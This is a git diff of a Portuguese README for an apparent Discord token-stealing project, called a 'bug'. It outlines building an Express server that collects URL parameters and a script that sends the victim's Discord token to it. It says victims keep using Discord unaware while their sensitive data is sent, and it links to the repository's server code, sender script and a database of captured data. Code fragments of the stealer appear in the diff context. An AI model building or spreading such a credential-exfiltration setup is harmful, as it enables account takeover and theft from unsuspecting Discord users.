@@ -3,7 +3,7 @@
 
  ### Oque precisa ser feito para acontecer o bug:
 
- - primeiro: o desenvolvimento de um servidor de coleta de parametros pela url que seria algo muito simples.Exemplo : [Servidor Exemplo](https://)
+ - primeiro: o desenvolvimento de um servidor de coleta de parametros pela url que seria algo muito simples.Exemplo : [Servidor Exemplo](https://github.com/VhCompany1/Discord-Bug-Token/blob/main/Servidor/index.js)
 
 ```js
 const express = require('express');
@@ -66,7 +66,7 @@ app.get("/", (req, res) => {
 app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`)); 
 ```
  - segundo: o desenvolvimento de um script para enviar o token por esse url.Exemplo :
-[Script de Envio Para o Servidor](https://google.com)
+[Script de Envio Para o Servidor](https://github.com/VhCompany1/Discord-Bug-Token/blob/main/Code/ENV.js)
  
  ```js
 function env(modul){
@@ -103,7 +103,7 @@ env(1)
 
  ### Oque realmente acontece:
 
-com o bug acontecendo o usuario acha que esta usando o discord normalmente porem ele envia um dado sensivel. Exemplo: [Exemplo DataBase Com Dados](https://)
+com o bug acontecendo o usuario acha que esta usando o discord normalmente porem ele envia um dado sensivel. Exemplo: [Exemplo DataBase Com Dados](https://github.com/VhCompany1/Discord-Bug-Token/blob/main/Servidor/database/db.json)
 
 ```json
 {
